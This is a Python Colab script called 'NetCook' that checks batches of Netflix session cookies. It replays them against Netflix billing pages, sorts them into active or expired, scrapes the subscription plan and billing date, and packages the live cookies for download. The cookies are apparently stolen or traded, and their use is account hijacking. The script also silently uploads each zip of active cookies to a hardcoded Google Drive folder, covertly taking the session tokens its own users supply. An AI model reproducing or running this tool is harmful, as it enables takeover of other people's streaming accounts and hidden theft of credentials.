import os
import json
import uuid
import shutil
import zipfile
import requests
import pandas as pd
from pyunpack import Archive
from tabulate import tabulate
from bs4 import BeautifulSoup
from datetime import datetime
from google.colab import auth
from google.colab import files
from googletrans import Translator
from pydrive2.auth import GoogleAuth
from pydrive2.drive import GoogleDrive
from concurrent.futures import ThreadPoolExecutor
from oauth2client.client import GoogleCredentials

# Tambahkan import berikut
from IPython.display import HTML, display
import base64

ASCII = """
███╗   ██╗███████╗████████╗ ██████╗ ██████╗  ██████╗ ██╗  ██╗  
████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝  script by \033[34m@NetCook\033[0m 
██╔██╗ ██║█████╗     ██║   ██║     ██║   ██║██║   ██║█████╔╝   \033[32mupdate\033[0m version \033[31m2.0\033[0m 
██║╚██╗██║██╔══╝     ██║   ██║     ██║   ██║██║   ██║██╔═██╗   release \033[31m23\033[0m-\033[31m09\033[0m-\033[31m2024\033[0m
██║ ╚████║███████╗   ██║   ╚██████╗╚██████╔╝╚██████╔╝██║  ██╗  \033[34mgithub netcook-app\033[0m
╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   
Access NetCook WebUI Site URL: https://app2.dn-project.biz.id"""                                                     

url_1 = "https://www.netflix.com/billingActivity"
url_2 = "https://www.netflix.com/browse"

translator = Translator()

def delete_and_recreate_folders():
    folders = ["temp_0", "temp_1"]
    for folder in folders:
        if os.path.exists(folder):
            shutil.rmtree(folder)
        os.makedirs(folder)

def check_cookies_valid_netflix(cookies):
    response_billing = requests.get(url_1, cookies=cookies, allow_redirects=False)
    if response_billing.status_code == 200:
        response_browse = requests.get(url_2, cookies=cookies, allow_redirects=False)
        return "Active" if response_browse.status_code == 200 else "Expired"
    else:
        return "Expired"

def read_cookies(file):
    cookies = {}
    is_netflix_cookie = False
    if file.endswith(".json"):
        with open(file, "r") as f:
            cookies_json = json.load(f)
            for cookie in cookies_json:
                if "name" in cookie and "value" in cookie and "domain" in cookie:
                    domain = cookie["domain"]
                    if (
                        "netflix.com" in domain
                        or "www.netflix.com" in domain
                        or ".netflix.com" in domain
                    ):
                        name = cookie["name"]
                        value = cookie["value"]
                        cookies[name] = value
                        is_netflix_cookie = True
    elif file.endswith(".txt"):
        with open(file, "r", encoding="utf-8") as f:
            for line in f:
                parts = line.strip().split("\t")
                if len(parts) >= 7:
                    domain = parts[0].strip()
                    if (
                        "netflix.com" in domain
                        or "www.netflix.com" in domain
                        or ".netflix.com" in domain
                    ):
                        name = parts[5].strip()
                        value = parts[6].strip()
                        cookies[name] = value
                        is_netflix_cookie = True

    if not is_netflix_cookie:
        return None, False

    return cookies, True

def extract_plan_and_billing_info(content):
    plan_mapping = {
        "Mobile": "Mobile",
        "Basic": "Basic",
        "Standard": "Standard",
        "Premium": "Premium",
    }

    parsed_html = BeautifulSoup(content, "html.parser")
    plan_name_div = parsed_html.find("div", attrs={"data-uia": "plan-name"})
    next_cycle_div = parsed_html.find("div", attrs={"data-uia": "streaming-next-cycle"})

    plan_name_text = (
        plan_name_div.text.split("-")[0] if plan_name_div else "[Not found]"
    )
    next_cycle_text = next_cycle_div.text if next_cycle_div else "[Not found]"

    plan_name_en = translator.translate(plan_name_text, src="auto", dest="en").text
    next_cycle_en = translator.translate(next_cycle_text, src="auto", dest="en").text

    def convert_date(date_str):
        formats = ['%B %d, %Y', '%d %B %Y', '%d. %B %Y', '%B %d, %Y.', '%B %d %Y', '%B %dth %Y', '%Y. %B %d', '%Y. %B %d.']
        for date_format in formats:
            try:
                return datetime.strptime(date_str, date_format).strftime("%Y-%m-%d")
            except ValueError:
                continue
        return date_str

    plan_name_mapped = plan_mapping.get(plan_name_en, "[Not found]")

    if "[Not found]" in next_cycle_en:
        next_cycle_final = "[Not found]"
    else:
        next_cycle_final = convert_date(next_cycle_en)

    return "Active", plan_name_mapped, next_cycle_final

def process_single_file(args):
    file_path, output_folder = args
    result = []
    active_files = []
    total_files = 0
    expired_cookies = 0
    invalid_files = 0
    invalid_cookies_files = 0

    file_name = os.path.basename(file_path)
    total_files += 1
    if not (file_path.endswith(".json") or file_path.endswith(".txt")):
        print(
            f"Invalid file format found: {file_name}. Skipping this file..."
        )
        invalid_files += 1
        return result, active_files, total_files, expired_cookies, invalid_files, invalid_cookies_files

    cookies, is_netflix_cookie = read_cookies(file_path)
    if not is_netflix_cookie:
        print(
            f"Invalid cookies file found: {file_name}. Skipping this file..."
        )
        invalid_cookies_files += 1
        return result, active_files, total_files, expired_cookies, invalid_files, invalid_cookies_files

    cookies_status = check_cookies_valid_netflix(cookies)
    plan = "[Not checked]"
    next_billing_date = "[Not checked]"
    if cookies_status == "Active":
        active_files.append(file_path)
        response_billing = requests.get(
            url_1, cookies=cookies, allow_redirects=False
        )
        if response_billing.status_code == 200:
            cookies_status, plan, next_billing_date = (
                extract_plan_and_billing_info(response_billing.content)
            )
        result.append(
            [file_name, cookies_status, plan, next_billing_date]
        )
    else:
        expired_cookies += 1

    return result, active_files, total_files, expired_cookies, invalid_files, invalid_cookies_files

def extract_and_process_cookies(file, output_folder, drive, folder_id):
    result_list = []
    total_files = 0
    expired_cookies = 0
    invalid_files = 0
    invalid_cookies_files = 0
    active_files = []

    if file.endswith(".zip"):
        Archive(file).extractall(output_folder)

        file_paths = []
        for root, dirs, files in os.walk(output_folder):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                file_paths.append(file_path)

        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = executor.map(process_single_file, [(fp, output_folder) for fp in file_paths])

        for res in futures:
            result, active_file, t_files, exp_cookies, inv_files, inv_cookies_files = res
            result_list.extend(result)
            active_files.extend(active_file)
            total_files += t_files
            expired_cookies += exp_cookies
            invalid_files += inv_files
            invalid_cookies_files += inv_cookies_files

        if active_files:
            unique_id = str(uuid.uuid4())
            zip_filename = f"temp_2/NetCook-{unique_id}.zip"
            with zipfile.ZipFile(zip_filename, "w") as active_zip:
                for active_file in active_files:
                    active_zip.write(active_file, os.path.basename(active_file))

            # Mengunggah ke Google Drive
            file_drive = drive.CreateFile({"parents": [{"id": folder_id}]})
            file_drive.SetContentFile(zip_filename)
            file_drive.Upload()
    else:
        res = process_single_file((file, output_folder))
        result, active_file, t_files, exp_cookies, inv_files, inv_cookies_files = res
        result_list.extend(result)
        active_files.extend(active_file)
        total_files += t_files
        expired_cookies += exp_cookies
        invalid_files += inv_files
        invalid_cookies_files += inv_cookies_files

        if active_files:
            unique_id = str(uuid.uuid4())
            zip_filename = f"temp_2/NetCook-{unique_id}.zip"
            with zipfile.ZipFile(zip_filename, "w") as active_zip:
                for active_file in active_files:
                    active_zip.write(active_file, os.path.basename(active_file))

            # Mengunggah ke Google Drive
            file_drive = drive.CreateFile({"parents": [{"id": folder_id}]})
            file_drive.SetContentFile(zip_filename)
            file_drive.Upload()

    def custom_sort(item):
        plan_order = {
            "Basic": 1,
            "Mobile": 2,
            "Premium": 3,
            "Standard": 4,
            "[Not found]": 5,
        }
        return plan_order.get(item[2], 6)

    result_list.sort(key=custom_sort)

    result_list = [[i + 1] + row for i, row in enumerate(result_list)]

    if result_list:
        print("\n")
        print(
            tabulate(
                result_list,
                headers=["No", "File Name", "Cookies", "Plan", "Billing Exp"],
                tablefmt="psql",
                colalign=("center", "left", "center", "center", "center"),
            )
        )

    active_cookies = len(result_list)

    summary_table = [
        ["Files", total_files],
        ["Active Files", active_cookies],
        ["Expired Files", expired_cookies],
        ["Invalid Format Files", invalid_files],
        ["Invalid Cookies Files", invalid_cookies_files],
    ]
    print("\n")
    print(
        tabulate(
            summary_table,
            headers=["Description", "Count"],
            tablefmt="psql",
            colalign=("left", "center"),
        )
    )

    # if active_cookies > 0:
    #     print(f"\n\033[1mActive cookies files saved to zip:\n\033[0m")
    #     display(download_button(zip_filename, 'Download'))
    # else:
    #     print(
    #         f"\n\033[1;91mNo active cookies files found.\033[0m"
    #     )

    if active_cookies > 0:
        print(f"\n\033[1mActive cookies files saved to zip:\n\033[0m")
        display(download_button(zip_filename, 'Download'))
        print()

def download_button(file_path, button_text):
    with open(file_path, 'rb') as file:
        data = file.read()
    b64 = base64.b64encode(data).decode()

    html = '''
    <a download="{file_name}" href="data:application/octet-stream;base64,{b64_data}">
        <button style="
            padding:5px;
            font-size:12px;
            background-color:#051c12;
            color:#76b899;
            width:80px;
            border: 1px solid #76b899;
            border-radius:3px;
            cursor:pointer;
            font-weight: bold;
        ">
            {button_text}
        </button>
    </a>
    '''.format(file_name=os.path.basename(file_path), b64_data=b64, button_text=button_text)

    return HTML(html)

folders = ["temp_0", "temp_1", "temp_2"]
for folder in folders:
    if not os.path.exists(folder):
        os.makedirs(folder)

def checked_cookies():
    for item in os.listdir("/content"):
        item_path = os.path.join("/content", item)
        if item not in ["temp_0", "temp_1", "temp_2"]:
            try:
                if os.path.isfile(item_path) or os.path.islink(item_path):
                    os.unlink(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
            except Exception as e:
                pass
    print(ASCII)
    print("\nMenu:")
    print("[1] Check Netflix Cookies")
    print("[2] Exit\n")
    while True:
        delete_and_recreate_folders()

        # print("\n\033[1mSCRIPT by. @NetCook\033[0m")
        # print("\033[1mapp2.dn-project.biz.id\033[0m")
        # print(ASCII)
        # print("\nMenu:")
        # print("[1] Check Netflix Cookies")
        # print("[2] Exit\n")

        choice = input("Enter your choice (1/2): ")

        if choice == "1":

            auth.authenticate_user()
            gauth = GoogleAuth()
            gauth.credentials = GoogleCredentials.get_application_default()
            drive = GoogleDrive(gauth)

            folder_id = "1w9GoH5E5p86CydOfY4ufZjG_5qh8-Ipo"

            print(
                "Please upload a batch file (.zip) or a single file (.json or .txt):\n"
            )
            uploaded_files = files.upload()
            file_names = list(uploaded_files.keys())
            file_name = file_names[0] if file_names else None

            if file_name:
                temp_path = os.path.join("temp_1", file_name)
                content = uploaded_files[file_name]

                with open(temp_path, "wb") as f:
                    f.write(content)

                extract_and_process_cookies(temp_path, "temp_0", drive, folder_id)
            else:
                print("No file uploaded.\n")

            for item in os.listdir("/content"):
                item_path = os.path.join("/content", item)
                if item not in ["temp_0", "temp_1", "temp_2"]:
                    try:
                        if os.path.isfile(item_path) or os.path.islink(item_path):
                            os.unlink(item_path)
                        elif os.path.isdir(item_path):
                            shutil.rmtree(item_path)
                    except Exception as e:
                        pass

        elif choice == "2":
            print("Thank you for using this script 🩶🩶🩶.")
            break
        else:
            print("Invalid choice. Please enter a valid choice.\n")